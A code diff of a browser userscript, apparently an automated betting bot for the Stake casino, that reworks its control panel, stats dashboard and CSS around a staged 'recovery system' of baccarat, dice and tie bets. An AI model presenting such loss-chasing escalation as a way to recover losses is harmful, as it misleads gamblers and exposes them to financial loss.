+        document.getElementById("st-dd").innerText = bot.stats.maxDD.toFixed(8);
+        document.getElementById("st-bets").innerText = bot.stats.bets;
+        document.getElementById("st-wl").innerHTML = `<span style="color:#10B981">${bot.stats.wins}</span> / <span style="color:#F59E0B">${bot.stats.loss}</span>`;
+        document.getElementById("st-status").innerText = bot.currentStatus;
         
-        const profitInUsdt = bot.stats.profit * bot.fiatRates.usdt;
-        const profitInIdr = bot.stats.profit * bot.fiatRates.idr;
-        const wageredInUsdt = bot.stats.wagered * bot.fiatRates.usdt;
-        const wageredInIdr = bot.stats.wagered * bot.fiatRates.idr;
-        const rakebackInUsdt = rakeback * bot.fiatRates.usdt;
-        const rakebackInIdr = rakeback * bot.fiatRates.idr;
-        const balanceInUsdt = bot.stats.currentBal * bot.fiatRates.usdt;
-        const balanceInIdr = bot.stats.currentBal * bot.fiatRates.idr;
+        let stageText = "";
+        if (bot.currentStage === "BACCARAT_REVERSE") stageText = `REVERSE (${bot.baccaratReverse.betsInSession}/100)`;
+        else if (bot.currentStage === "DICE_RECOVERY") stageText = `DICE ${bot.diceRecovery.currentChance}% (${bot.diceRecovery.remainingBets}/5)`;
+        else if (bot.currentStage === "TIE_RECOVERY") stageText = `TIE 8:1`;
+        else stageText = `WAGERING (${bot.wagering.betsInWagering}/${document.getElementById("p-wagering-bets").value})`;
+        document.getElementById("st-stage").innerHTML = `<span style="color:#8B5CF6">${stageText}</span>`;
         
-        const maxDDPct = bot.stats.startBal > 0 ? (bot.stats.maxDD / bot.stats.startBal * 100) : 0;
-        const maxBetPct = bot.stats.startBal > 0 ? (bot.stats.maxBet / bot.stats.startBal * 100) : 0;
-        
-        const els = {
-            "st-user": bot.stakeUser,
-            "st-running-time": runTime,
-            "st-balance": `${bot.stats.currentBal.toFixed(8)} ${bot.selectedCurrency.toUpperCase()}`,
-            "st-balance-fiat": `≈ ${formatIdr(balanceInIdr)} | ≈ ${balanceInUsdt.toFixed(2)} USDT`,
-            "st-profit": `${bot.stats.profit >= 0 ? '+' : ''}${bot.stats.profit.toFixed(8)} (${profitPct >= 0 ? '+' : ''}${profitPct.toFixed(2)}%)`,
-            "st-profit-fiat": `≈ ${formatIdr(profitInIdr)} | ≈ ${profitInUsdt.toFixed(2)} USDT`,
-            "st-wagered": `${bot.stats.wagered.toFixed(8)}`,
-            "st-wagered-fiat": `≈ ${formatIdr(wageredInIdr)} | ≈ ${wageredInUsdt.toFixed(2)} USDT`,
-            "st-rakeback": `+${rakeback.toFixed(8)}`,
-            "st-rakeback-fiat": `≈ ${formatIdr(rakebackInIdr)} | ≈ ${rakebackInUsdt.toFixed(2)} USDT`,
-            "st-bets": `${bot.stats.bets} | WR ${winRate.toFixed(1)}%`,
-            "st-speed": `${betSpeed.toFixed(2)} bet/s`,
-            "st-maxdd": `${bot.stats.maxDD.toFixed(8)} (${maxDDPct.toFixed(2)}%)`,
-            "st-maxbet": `${bot.stats.maxBet.toFixed(8)} (${maxBetPct.toFixed(2)}%)`,
-            "st-mode": `${mode} | SL ${bot.stopLossPercent}%`,
-            "st-chance": `${bot.currentChance.toFixed(1)}% | Bet ${bot.baseBet.toFixed(8)}`
-        };
-        
-        for (const [id, val] of Object.entries(els)) {
-            const el = document.getElementById(id);
-            if (el) el.textContent = val;
-        }
-        
-        const profitEl = document.getElementById("st-profit");
-        if (profitEl) profitEl.style.color = bot.stats.profit >= 0 ? "#00A86B" : "#FF4757";
-        const profitFiatEl = document.getElementById("st-profit-fiat");
-        if (profitFiatEl) profitFiatEl.style.color = bot.stats.profit >= 0 ? "#00A86B" : "#FF4757";
-        
-        // Update baccarat display info
-        const baccaratStatus = document.getElementById("baccarat-status");
-        if (baccaratStatus) {
-            if (bot.baccarat.active) {
-                baccaratStatus.innerHTML = "🟢 ACTIVE";
-                baccaratStatus.style.color = "#00A86B";
-            } else if (bot.baccarat.enabled) {
-                baccaratStatus.innerHTML = "🟡 STANDBY";
-                baccaratStatus.style.color = "#FBBF24";
-            } else {
-                baccaratStatus.innerHTML = "⚫ DISABLED";
-                baccaratStatus.style.color = "#94A3B8";
-            }
-        }
-        
-        const baccaratStats = document.getElementById("baccarat-stats");
-        if (baccaratStats) {
-            baccaratStats.innerHTML = `Bets: ${bot.baccarat.betCount} | Loss: ${bot.baccarat.lossSinceStart.toFixed(8)} | Step: ${bot.baccarat.consecutiveLosses}`;
-        }
-    }
-    
-    function formatIdr(num) {
-        const abs = Math.abs(num);
-        const sign = num < 0 ? "-" : "";
-        if (abs >= 1000000000) return `${sign}Rp ${(abs/1000000000).toFixed(2)}B`;
-        if (abs >= 1000000) return `${sign}Rp ${(abs/1000000).toFixed(1)}M`;
-        if (abs >= 1000) return `${sign}Rp ${(abs/1000).toFixed(1)}K`;
-        return `${sign}Rp ${abs.toFixed(0)}`;
-    }
-    
-    function resetSession() {
-        if (bot.isRunning) {
-            updateUILog("Stop bot first before resetting session!");
-            return;
-        }
-        bot.stats = {
-            profit: 0, wagered: 0, startBal: 0, currentBal: 0,
-            bets: 0, wins: 0, loss: 0, startTime: null, maxDD: 0, maxBet: 0
-        };
-        bot.betTimestamps = [];
-        bot.startTime = null;
-        bot.wagerBetCounter = 0;
-        bot.isWagerMode = false;
-        bot.baccarat.active = false;
-        bot.baccarat.betCount = 0;
-        bot.baccarat.consecutiveLosses = 0;
-        bot.emergency.active = false;
-        updateUILog("Session reset!");
-        updateStatsDisplay();
-    }
-
-    function toggleStartStop(starting) {
-        const startBtn = document.getElementById("p-start");
-        const stopBtn = document.getElementById("p-stop");
-        const statusEl = document.getElementById("botStatus");
-        const dotEl = document.getElementById("statusDot");
-        
-        if (starting) {
-            startBtn.disabled = true;
-            stopBtn.disabled = false;
-            statusEl.textContent = "RUNNING";
-            dotEl.style.background = "#00A86B";
+        const useAuto = document.getElementById("p-basebet-auto").checked;
+        if (useAuto) {
+            const divisor = document.getElementById("p-basebet-divisor").value;
+            document.getElementById("basebet-info").value = `Auto: Balance / ${divisor} = ${getBaseBet().toFixed(8)}`;
         } else {
-            startBtn.disabled = false;
-            stopBtn.disabled = true;
-            statusEl.textContent = "STOPPED";
-            dotEl.style.background = "#FF4757";
-        }
-    }
-    
-    function toggleMinimize() {
-        bot.minimized = !bot.minimized;
-        const body = document.getElementById("bot-body");
-        const btn = document.getElementById("btn-minimize");
-        if (bot.minimized) {
-            body.style.display = "none";
-            btn.textContent = "▼";
-        } else {
-            body.style.display = "block";
-            btn.textContent = "▲";
-        }
-    }
-    
-    function toggleDarkMode() {
-        bot.darkMode = !bot.darkMode;
-        applyTheme();
-    }
-    
-    function applyTheme() {
-        const root = document.getElementById("BotConsole");
-        if (!root) return;
-        
-        if (bot.darkMode) {
-            root.style.setProperty('--bg', '#1a1a2e');
-            root.style.setProperty('--bg-block', '#16213e');
-            root.style.setProperty('--text', '#e0e0e0');
-            root.style.setProperty('--text-light', '#a0a0a0');
-            root.style.setProperty('--border', '#2a2a4a');
-            root.style.setProperty('--log-bg', '#0f0f1a');
-        } else {
-            root.style.setProperty('--bg', '#ffffff');
-            root.style.setProperty('--bg-block', '#f8f9fa');
-            root.style.setProperty('--text', '#1a1a1a');
-            root.style.setProperty('--text-light', '#6b7280');
-            root.style.setProperty('--border', '#e5e7eb');
-            root.style.setProperty('--log-bg', '#f8f9fa');
+            const fixed = document.getElementById("p-basebet-fixed").value;
+            document.getElementById("basebet-info").value = `Fixed: ${fixed} = ${getBaseBet().toFixed(8)}`;
         }
     }
 
-    // ==================== UI DRAGGING ====================
-    let pos1 = 0, pos2 = 0, pos3 = 0, pos4 = 0;
-    
-    function dragMouseDown(e) {
-        e = e || window.event;
-        e.preventDefault();
-        pos3 = e.clientX;
-        pos4 = e.clientY;
-        document.onmouseup = closeDragElement;
-        document.onmousemove = elementDrag;
-    }
-
-    function elementDrag(e) {
-        const elmnt = document.getElementById("BotConsole");
-        e = e || window.event;
-        e.preventDefault();
-        pos1 = pos3 - e.clientX;
-        pos2 = pos4 - e.clientY;
-        pos3 = e.clientX;
-        pos4 = e.clientY;
-        
-        let newTop = elmnt.offsetTop - pos2;
-        let newLeft = elmnt.offsetLeft - pos1;
-        
-        if (newLeft < 0) newLeft = 0;
-        if (newTop < 0) newTop = 0;
-        if (newLeft > (window.innerWidth - elmnt.offsetWidth)) newLeft = window.innerWidth - elmnt.offsetWidth;
-        if (newTop > (window.innerHeight - elmnt.offsetHeight)) newTop = window.innerHeight - elmnt.offsetHeight;
-
-        elmnt.style.top = newTop + "px";
-        elmnt.style.left = newLeft + "px";
-        elmnt.style.right = "auto";
-    }
-
-    function closeDragElement() {
-        document.onmouseup = null;
-        document.onmousemove = null;
-    }
-
-    // ==================== TAB SYSTEM ====================
-    window.openTab = function(tabName) {
-        document.querySelectorAll('.tab-content').forEach(tab => tab.classList.remove('active'));
-        document.getElementById(`tab-${tabName}`).classList.add('active');
-        document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
-        if (event && event.currentTarget) event.currentTarget.classList.add('active');
-    };
-
-    // ==================== CREATE UI ====================
+    // ========== CREATE UI ==========
     function createUI() {
-        if (document.getElementById("BotConsole")) document.getElementById("BotConsole").remove();
+        if (document.getElementById("orion-wrap")) return;
         
-        const style = document.createElement("style");
-        style.innerHTML = `
-            #BotConsole {
-                --bg: #ffffff;
-                --bg-block: #f8f9fa;
-                --text: #1a1a1a;
-                --text-light: #6b7280;
-                --border: #e5e7eb;
-                --log-bg: #f8f9fa;
-                --accent: #4A90D9;
-                --success: #00A86B;
-                --danger: #FF4757;
-                
+        const s = document.createElement("style");
+        s.innerHTML = `
+            * { margin: 0; padding: 0; box-sizing: border-box; }
+            
+            #orion-wrap {
                 position: fixed;
-                top: 20px;
-                right: 20px;
-                width: 560px;
-                background: var(--bg);
-                border-radius: 16px;
-                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-                font-size: 13px;
-                box-shadow: 0 8px 32px rgba(0,0,0,0.12);
-                border: 1px solid var(--border);
+                top: 16px;
+                right: 16px;
+                width: min(420px, calc(100vw - 32px));
+                background: #FFFFFF;
+                color: #1F2937;
                 z-index: 99999;
-                overflow: hidden;
-                color: var(--text);
-                transition: background 0.3s, border-color 0.3s;
+                border-radius: 16px;
+                font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+                box-shadow: 0 10px 40px rgba(0,0,0,0.12);
+                border: 1px solid #E5E7EB;
+                max-height: 90vh;
+                overflow-y: auto;
             }
             
-            .bot-header {
-                background: var(--accent);
-                padding: 10px 16px;
-                cursor: move;
-                display: flex;
-                justify-content: space-between;
-                align-items: center;
-                color: white;
-                user-select: none;
+            #orion-wrap::-webkit-scrollbar { width: 4px; }
+            #orion-wrap::-webkit-scrollbar-track { background: #F3F4F6; border-radius: 4px; }
+            #orion-wrap::-webkit-scrollbar-thumb { background: #10B981; border-radius: 4px; }
+            
+            .orion-header { 
+                padding: 16px 20px; 
+                background: linear-gradient(135deg, #10B981 0%, #8B5CF6 100%);
+                border-bottom: none;
             }
-            .bot-header .title { font-weight: 700; font-size: 15px; }
-            .bot-header .header-btns { display: flex; gap: 6px; }
-            .bot-header .header-btns button {
-                background: rgba(255,255,255,0.2);
-                border: none;
-                color: white;
-                width: 28px;
-                height: 28px;
-                border-radius: 8px;
-                cursor: pointer;
-                font-size: 12px;
-                font-weight: 700;
+            .orion-title { 
+                font-size: 20px; 
+                font-weight: 700; 
+                color: #FFFFFF;
+                letter-spacing: -0.3px;
             }
-            .bot-header .header-btns button:hover { background: rgba(255,255,255,0.35); }
-            .time-running { 
-                background: rgba(255,255,255,0.18); 
-                padding: 4px 10px; 
+            .orion-badge { 
+                font-size: 10px; 
+                color: rgba(255,255,255,0.8); 
+                background: rgba(255,255,255,0.2); 
+                padding: 2px 8px; 
+                border-radius: 20px; 
+                display: inline-block; 
+                margin-top: 6px;
+            }
+            
+            .orion-tabs { 
+                display: flex; 
+                padding: 0; 
+                gap: 0; 
+                background: #FFFFFF; 
+                border-bottom: 1px solid #E5E7EB;
+            }
+            .orion-tab { 
+                padding: 12px 16px; 
+                font-size: 12px; 
+                font-weight: 600; 
+                color: #6B7280; 
+                cursor: pointer; 
+                border-bottom: 2px solid transparent;
+                flex: 1;
+                text-align: center;
+            }
+            .orion-tab:hover { color: #10B981; }
+            .orion-tab.active { color: #10B981; border-bottom-color: #10B981; }
+            
+            .orion-tab-content { display: none; padding: 16px; }
+            .orion-tab-content.active { display: block; }
+            
+            .orion-card { 
+                background: #F9FAFB; 
                 border-radius: 12px; 
+                padding: 14px; 
+                margin-bottom: 12px; 
+                border: 1px solid #E5E7EB;
+            }
+            .orion-card-title { 
                 font-size: 11px; 
-                font-family: monospace; 
+                font-weight: 700; 
+                color: #8B5CF6; 
+                margin-bottom: 12px;
+                text-transform: uppercase;
+                letter-spacing: 0.5px;
             }
             
-            .tab-bar { display: flex; padding: 0 12px; gap: 0; border-bottom: 1px solid var(--border); background: var(--bg); flex-wrap: wrap; }
-            .tab-btn {
-                padding: 10px 16px; background: transparent; border: none; color: var(--text-light);
-                font-size: 12px; font-weight: 600; cursor: pointer; border-bottom: 2px solid transparent;
+            .orion-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
+            .orion-input-group { display: flex; flex-direction: column; gap: 4px; }
+            .orion-input-group label { font-size: 10px; font-weight: 500; color: #6B7280; }
+            .orion-input, .orion-select { 
+                background: #FFFFFF; 
+                border: 1px solid #D1D5DB; 
+                color: #1F2937; 
+                padding: 8px 10px; 
+                border-radius: 8px; 
+                font-size: 12px;
                 transition: all 0.2s;
             }
-            .tab-btn.active { color: var(--accent); border-bottom-color: var(--accent); }
-            
-            .tab-content { display: none; padding: 14px; }
-            .tab-content.active { display: block; }
-            
-            .controls-row {
-                display: flex; gap: 10px; align-items: center; margin-bottom: 12px;
-                background: var(--bg-block); padding: 10px 14px; border-radius: 12px;
-                border: 1px solid var(--border);
+            .orion-input:focus, .orion-select:focus { 
+                outline: none; 
+                border-color: #10B981; 
+                box-shadow: 0 0 0 2px rgba(16,185,129,0.1);
             }
-            .controls-row .btn-group { display: flex; gap: 8px; flex: 1; }
-            .controls-row select {
-                background: var(--bg); border: 1px solid var(--border);
-                padding: 10px 12px; border-radius: 10px; font-size: 13px; font-weight: 600;
-                color: var(--text); font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            }
-            
-            .stats-block {
-                background: var(--bg-block);
-                border-radius: 12px;
-                padding: 14px 16px;
-                margin-bottom: 12px;
-                border: 1px solid var(--border);
-                font-family: monospace;
-                font-size: 12px;
-                line-height: 1.7;
-            }
-            .stats-block .line { display: flex; justify-content: space-between; align-items: center; padding: 2px 0; }
-            .stats-block .line .label { color: var(--text-light); font-size: 11px; white-space: nowrap; }
-            .stats-block .line .value { font-weight: 600; text-align: right; }
-            .stats-block .line .value-sub { font-size: 10px; color: var(--text-light); text-align: right; }
-            .stats-block .divider { border-top: 1px dashed var(--border); margin: 6px 0; }
-            
-            .logs-container {
-                background: var(--log-bg);
-                border-radius: 10px;
-                height: 420px;
-                overflow-y: auto;
-                padding: 8px 10px;
-                font-family: monospace;
-                font-size: 11px;
-                border: 1px solid var(--border);
-            }
-            
-            .btn { 
-                padding: 10px 14px; border: none; border-radius: 10px; 
-                font-weight: 700; font-size: 13px; cursor: pointer; transition: all 0.2s; 
-                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            }
-            .btn-start { background: var(--success); color: white; }
-            .btn-start:hover:not(:disabled) { filter: brightness(1.1); }
-            .btn-stop { background: var(--danger); color: white; }
-            .btn-stop:hover:not(:disabled) { filter: brightness(1.1); }
-            .btn-reset { background: var(--text-light); color: white; font-size: 11px; }
-            .btn:disabled { opacity: 0.5; cursor: not-allowed; }
-            
-            .token-row { display: flex; gap: 8px; margin-bottom: 12px; }
-            .token-row input { 
-                flex: 1; background: var(--bg-block); border: 1px solid var(--border); 
-                padding: 10px 12px; border-radius: 10px; font-size: 12px; font-family: monospace; 
-                color: var(--text);
-            }
-            .token-row button { 
-                background: var(--accent); border: none; padding: 0 14px; border-radius: 10px; 
-                color: white; font-weight: 600; cursor: pointer; font-size: 12px; 
-            }
-            
-            .toggle-row { 
-                display: flex; justify-content: space-between; align-items: center; 
-                background: var(--bg-block); padding: 10px 14px; border-radius: 10px; 
-                margin-bottom: 10px; border: 1px solid var(--border); 
-            }
-            
-            .md-switch { position: relative; width: 48px; height: 26px; }
-            .md-switch input { opacity: 0; width: 0; height: 0; }
-            .md-slider { 
-                position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0; 
-                background: var(--border); transition: .3s; border-radius: 26px; 
-            }
-            .md-slider:before { 
-                position: absolute; content: ""; height: 20px; width: 20px; 
-                left: 3px; bottom: 3px; background: white; transition: .3s; 
-                border-radius: 50%; box-shadow: 0 1px 3px rgba(0,0,0,0.2); 
-            }
-            input:checked + .md-slider { background: var(--success); }
-            input:checked + .md-slider:before { transform: translateX(22px); }
-            
-            .md-field { margin-bottom: 12px; }
-            .md-field label { 
-                display: block; font-size: 11px; font-weight: 500; color: var(--text-light); 
-                margin-bottom: 4px; 
-            }
-            .md-field input, .md-field select { 
-                width: 100%; background: var(--bg-block); border: 1px solid var(--border); 
-                padding: 10px 12px; border-radius: 10px; font-size: 13px; font-family: monospace; 
-                color: var(--text);
-            }
-            .md-field input:focus, .md-field select:focus { 
-                outline: none; border-color: var(--accent); 
-            }
-            .md-field input[readonly] {
-                background: var(--border);
-                cursor: not-allowed;
-                opacity: 0.7;
-            }
-            
-            .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
-            .info-box { 
-                background: var(--bg-block); border-radius: 10px; padding: 12px; 
-                font-size: 11px; line-height: 1.6; border: 1px solid var(--border); 
-                color: var(--text-light);
-            }
-            .status-inline { display: flex; align-items: center; gap: 6px; font-size: 11px; margin-bottom: 6px; color: var(--text-light); }
-            .status-inline .dot { width: 8px; height: 8px; border-radius: 50%; display: inline-block; }
-            
-            .baccarat-display {
-                background: var(--bg-block);
-                border-radius: 12px;
-                padding: 12px;
-                margin: 12px 0;
-                border: 1px solid var(--border);
-            }
-            .baccarat-row {
+            .orion-radio-group {
                 display: flex;
-                justify-content: space-between;
+                gap: 16px;
                 align-items: center;
-                padding: 8px;
-                border-bottom: 1px solid var(--border);
+                padding: 4px 0;
             }
-            .baccarat-label {
-                font-size: 11px;
-                font-weight: 600;
-                color: var(--text-light);
-            }
-            .baccarat-cards {
-                font-size: 14px;
-                font-weight: 600;
-                font-family: monospace;
-            }
-            .baccarat-cards.player { color: var(--success); }
-            .baccarat-cards.banker { color: var(--danger); }
-            .baccarat-winner {
-                text-align: center;
-                font-size: 12px;
-                font-weight: 700;
-                padding: 8px;
-                margin-top: 8px;
-                border-radius: 30px;
-            }
-            .baccarat-info {
+            .orion-radio-group label {
                 display: flex;
-                justify-content: space-between;
-                margin-top: 8px;
-                font-size: 10px;
-                color: var(--text-light);
+                align-items: center;
+                gap: 6px;
+                font-size: 11px;
+                font-weight: normal;
+                cursor: pointer;
+            }
+            .orion-checkbox { 
+                display: flex; 
+                align-items: center; 
+                gap: 8px; 
+                margin: 10px 0;
+                padding: 6px 0;
+            }
+            .orion-checkbox input { width: 16px; height: 16px; accent-color: #10B981; }
+            
+            .orion-stats { 
+                background: #F0FDF4; 
+                border-radius: 12px; 
+                padding: 14px; 
+                margin-bottom: 12px;
+                border: 1px solid #D1FAE5;
+            }
+            .orion-stat-row { 
+                display: flex; 
+                justify-content: space-between; 
+                padding: 8px 0; 
+                border-bottom: 1px solid #D1FAE5;
+            }
+            .orion-stat-row:last-child { border-bottom: none; }
+            .orion-stat-label { font-size: 11px; font-weight: 500; color: #6B7280; }
+            .orion-stat-value { font-weight: 600; font-family: monospace; font-size: 12px; color: #1F2937; }
+            
+            .baccarat-display { background: #F9FAFB; border-radius: 12px; padding: 12px; margin: 12px 0; border: 1px solid #E5E7EB; }
+            .baccarat-row { 
+                display: flex; 
+                justify-content: space-between; 
+                padding: 8px 12px; 
+                background: #FFFFFF; 
+                border-radius: 8px; 
+                margin-bottom: 8px;
+                border: 1px solid #E5E7EB;
+            }
+            .baccarat-cards.player { color: #10B981; font-weight: 600; }
+            .baccarat-cards.banker { color: #F59E0B; font-weight: 600; }
+            .baccarat-winner { 
+                text-align: center; 
+                padding: 8px; 
+                margin-top: 8px; 
+                border-radius: 8px; 
+                background: #F3F4F6; 
+                font-weight: 600; 
+                font-size: 12px;
             }
             
-            ::-webkit-scrollbar { width: 4px; }
-            ::-webkit-scrollbar-track { background: transparent; }
-            ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 4px; }
+            .orion-log { 
+                background: #1F2937; 
+                border-radius: 10px; 
+                padding: 10px 12px; 
+                font-size: 10px; 
+                font-family: monospace; 
+                color: #FCD34D; 
+                max-height: 100px; 
+                overflow-y: auto;
+            }
+            
+            .orion-buttons { display: flex; gap: 10px; margin-top: 12px; }
+            .orion-btn { 
+                flex: 1; 
+                padding: 10px; 
+                border-radius: 10px; 
+                font-weight: 600; 
+                cursor: pointer; 
+                border: none;
+                font-size: 12px;
+                transition: all 0.2s;
+            }
+            .orion-btn-start { 
+                background: linear-gradient(135deg, #10B981, #059669); 
+                color: #FFFFFF;
+            }
+            .orion-btn-start:hover { transform: translateY(-1px); box-shadow: 0 4px 12px rgba(16,185,129,0.3); }
+            .orion-btn-stop { 
+                background: #FEF2F2; 
+                border: 1px solid #FCA5A5; 
+                color: #DC2626;
+            }
+            .orion-btn-stop:hover { background: #FEE2E2; }
+            .orion-btn-icon { 
+                background: #F3F4F6; 
+                border: 1px solid #E5E7EB; 
+                padding: 8px 14px; 
+                border-radius: 10px; 
+                color: #4B5563; 
+                cursor: pointer;
+                font-size: 11px;
+                font-weight: 500;
+            }
+            .orion-btn-icon:hover { background: #E5E7EB; }
+            
+            .api-row { display: flex; gap: 8px; margin-bottom: 12px; }
+            .api-row input { 
+                flex: 1; 
+                background: #FFFFFF; 
+                border: 1px solid #D1D5DB; 
+                color: #1F2937; 
+                padding: 10px 12px; 
+                border-radius: 10px; 
+                font-size: 11px;
+                font-family: monospace;
+            }
+            .orion-user, .orion-price { font-size: 11px; padding: 4px 0; color: #6B7280; }
+            .row-full { grid-column: span 2; }
+            .text-muted { color: #6B7280; font-size: 10px; }
+            hr { margin: 12px 0; border-color: #E5E7EB; }
         `;
-        document.head.appendChild(style);
+        document.head.appendChild(s);
         
-        const html = `
-            <div id="BotConsole">
-                <div class="bot-header" id="botHeader">
-                    <div style="display: flex; align-items: center; gap: 10px;">
-                        <span class="title">404 BOT v7.0</span>
-                        <span class="time-running" id="st-running-time">0s</span>
-                    </div>
-                    <div class="header-btns">
-                        <button id="btn-theme" title="Dark/Light">&#9789;</button>
-                        <button id="btn-minimize" title="Minimize">&#9650;</button>
+        const d = document.createElement("div");
+        d.id = "orion-wrap";
+        d.innerHTML = `
+            <div class="orion-header">
+                <div class="orion-title">⚡ 404 ULTIMATE</div>
+                <div class="orion-badge">3-STAGE RECOVERY SYSTEM</div>
+            </div>
+            
+            <div style="padding: 12px 16px 0 16px">
+                <div class="api-row">
+                    <input type="password" id="p-api-token" placeholder="Enter Stake API Token">
+                    <button id="p-login" class="orion-btn-icon">LOGIN</button>
+                    <button id="p-refresh" class="orion-btn-icon">⟳</button>
+                </div>
+                <div id="st-user" style="font-size:11px;color:#6B7280">⚡ Not logged in</div>
+                <div id="st-idr-price" style="font-size:11px;color:#F59E0B">💰 Loading price...</div>
+            </div>
+            
+            <div class="orion-tabs">
+                <div class="orion-tab active" data-tab="dashboard">DASHBOARD</div>
+                <div class="orion-tab" data-tab="settings">SETTINGS</div>
+                <div class="orion-tab" data-tab="baccarat">BACCARAT</div>
+            </div>
+            
+            <div class="orion-tab-content active" id="tab-dashboard">
+                <div class="orion-stats">
+                    <div class="orion-stat-row"><span class="orion-stat-label">⏱️ UPTIME</span><span class="orion-stat-value" id="st-time">00:00:00</span></div>
+                    <div class="orion-stat-row"><span class="orion-stat-label">⚙️ STATUS</span><span class="orion-stat-value" id="st-status" style="color:#10B981">IDLE</span></div>
+                    <div class="orion-stat-row"><span class="orion-stat-label">🎯 STAGE</span><span class="orion-stat-value" id="st-stage">-</span></div>
+                    <div class="orion-stat-row"><span class="orion-stat-label">💰 BALANCE</span><span class="orion-stat-value" id="st-startbal">0.00000000</span></div>
+                    <div class="orion-stat-row"><span class="orion-stat-label">📈 PROFIT</span><span class="orion-stat-value" id="st-profit">0.00000000</span></div>
+                    <div class="orion-stat-row"><span class="orion-stat-label">🎲 WAGERED</span><span class="orion-stat-value" id="st-wager">0.00000000</span></div>
+                    <div class="orion-stat-row"><span class="orion-stat-label">📉 MAX DD</span><span class="orion-stat-value" id="st-dd">0.00000000</span></div>
+                    <div class="orion-stat-row"><span class="orion-stat-label">🎯 BETS</span><span class="orion-stat-value" id="st-bets">0</span></div>
+                    <div class="orion-stat-row"><span class="orion-stat-label">🏆 W/L</span><span class="orion-stat-value" id="st-wl">0/0</span></div>
+                </div>
+                
+                <div class="orion-log" id="st-log">Ready. Enter API Token and click LOGIN...</div>
+                
+                <div class="orion-buttons">
+                    <button id="p-start" class="orion-btn orion-btn-start" disabled>▶ START</button>
+                    <button id="p-stop" class="orion-btn orion-btn-stop" disabled>⏹ STOP</button>
+                </div>
+            </div>
+            
+            <div class="orion-tab-content" id="tab-settings">
+                <div class="orion-card">
+                    <div class="orion-card-title">⚙️ SYSTEM</div>
+                    <div class="orion-grid">
+                        <div class="orion-input-group row-full"><label>CURRENCY</label><select id="p-currency" class="orion-select"></select></div>
+                        <div class="orion-input-group"><label>PROFIT TRIGGER</label><input id="p-profit-trigger" class="orion-input" value="0.01"></div>
+                        <div class="orion-input-group"><label>LOSS TRIGGER</label><input id="p-loss-trigger" class="orion-input" value="0.01"></div>
                     </div>
                 </div>
                 
-                <div id="bot-body">
-                    <div class="tab-bar">
-                        <button class="tab-btn active" onclick="openTab.call(this, 'main')">MAIN</button>
-                        <button class="tab-btn" onclick="openTab.call(this, 'config')">CONFIG</button>
-                        <button class="tab-btn" onclick="openTab.call(this, 'wager')">WAGER</button>
-                        <button class="tab-btn" onclick="openTab.call(this, 'baccarat')">BACCARAT</button>
-                        <button class="tab-btn" onclick="openTab.call(this, 'logs')">LOGS</button>
-                    </div>
-                    
-                    <!-- TAB MAIN -->
-                    <div id="tab-main" class="tab-content active">
-                        <div class="token-row">
-                            <input type="password" id="p-token" placeholder="API Token">
-                            <button id="p-login">LOGIN</button>
-                            <button id="p-refresh">&#8635;</button>
-                        </div>
-                        
-                        <div class="toggle-row">
-                            <span style="font-weight:500;">DIRTY MODE (BET 0)</span>
-                            <label class="md-switch"><input type="checkbox" id="p-demo-toggle"><span class="md-slider"></span></label>
-                        </div>
-                        
-                        <div class="controls-row">
-                            <div class="btn-group">
-                                <button id="p-start" class="btn btn-start" disabled>START</button>
-                                <button id="p-stop" class="btn btn-stop" disabled>STOP</button>
-                                <button id="p-reset" class="btn btn-reset">RESET</button>
-                            </div>
-                            <select id="p-currency"></select>
-                        </div>
-                        
-                        <div class="status-inline">
-                            <span class="dot" id="statusDot" style="background:#FF4757;"></span>
-                            <span id="botStatus">STOPPED</span>
-                        </div>
-                        
-                        <div class="stats-block" id="stats-block">
-                            <div class="line"><span class="label">User</span><span class="value" id="st-user">-</span></div>
-                            <div class="line"><span class="label">Balance</span><span class="value" id="st-balance">0.00000000</span></div>
-                            <div class="line"><span class="label"></span><span class="value-sub" id="st-balance-fiat">-</span></div>
-                            <div class="divider"></div>
-                            <div class="line"><span class="label">Profit</span><span class="value" id="st-profit" style="color:#00A86B;">0.00000000 (0%)</span></div>
-                            <div class="line"><span class="label"></span><span class="value-sub" id="st-profit-fiat" style="color:#00A86B;">-</span></div>
-                            <div class="line"><span class="label">Wagered</span><span class="value" id="st-wagered">0.00000000</span></div>
-                            <div class="line"><span class="label"></span><span class="value-sub" id="st-wagered-fiat">-</span></div>
-                            <div class="line"><span class="label">Rakeback</span><span class="value" id="st-rakeback" style="color:#00A86B;">+0.00000000</span></div>
-                            <div class="line"><span class="label"></span><span class="value-sub" id="st-rakeback-fiat" style="color:#00A86B;">-</span></div>
-                            <div class="line"><span class="label">Bets | WR</span><span class="value" id="st-bets">0 | WR 0%</span></div>
-                            <div class="line"><span class="label">Speed</span><span class="value" id="st-speed">0 bet/s</span></div>
-                            <div class="line"><span class="label">Max DD</span><span class="value" id="st-maxdd">0.00000000 (0%)</span></div>
-                            <div class="line"><span class="label">Max Bet</span><span class="value" id="st-maxbet">0.00000000 (0%)</span></div>
-                            <div class="divider"></div>
-                            <div class="line"><span class="label">Mode | SL</span><span class="value" id="st-mode">HUNTER | SL 25%</span></div>
-                            <div class="line"><span class="label">Chance | Bet</span><span class="value" id="st-chance">-</span></div>
+                <div class="orion-card">
+                    <div class="orion-card-title">🎰 STAGE 1: BACCARAT REVERSE</div>
+                    <div class="orion-input-group row-full">
+                        <label>BASE BET MODE</label>
+                        <div class="orion-radio-group">
+                            <label><input type="radio" name="basebet-mode" id="p-basebet-auto" value="auto" checked> Auto (Balance / Divisor)</label>
+                            <label><input type="radio" name="basebet-mode" id="p-basebet-fixed-mode" value="fixed"> Fixed</label>
                         </div>
                     </div>
-                    
-                    <!-- TAB CONFIG -->
-                    <div id="tab-config" class="tab-content">
-                        <div class="md-field"><label>BASE BET % (dari Balance)</label><input type="number" id="p-basebet-pct" value="0.02" step="0.01"></div>
-                        <div class="md-field"><label>BASE BET (Auto)</label><input type="number" id="p-basebet" value="0" step="0.00000001" readonly></div>
